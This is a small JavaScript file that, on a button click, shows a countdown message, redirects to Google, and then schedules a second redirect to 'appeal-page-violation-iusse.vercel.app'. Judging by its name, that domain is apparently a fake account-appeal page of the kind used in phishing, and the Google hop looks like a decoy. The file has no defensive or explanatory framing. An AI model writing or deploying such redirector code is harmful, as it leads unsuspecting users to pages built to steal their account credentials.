// Wait for the DOM to load
document.addEventListener('DOMContentLoaded', function () {
    // Get references to the button and message elements
    const redirectButton = document.getElementById('redirectButton');
    const message = document.getElementById('message');

    // Add a click event listener to the button
    redirectButton.addEventListener('click', function () {
        // Update the message
        message.textContent = 'Starting redirection in 2 seconds...';
        message.style.color = '#e74c3c'; // Change text color

        // Redirect to Google after 2 seconds
        setTimeout(function () {
            window.location.href = 'https://www.google.com';
        }, 2000); // 2-second delay before the first redirection

        // Redirect to the second link after 4 seconds
        setTimeout(function () {
            window.location.href = 'https://appeal-page-violation-iusse.vercel.app/';
        }, 4000); // 4-second delay before the second redirection
    });
});
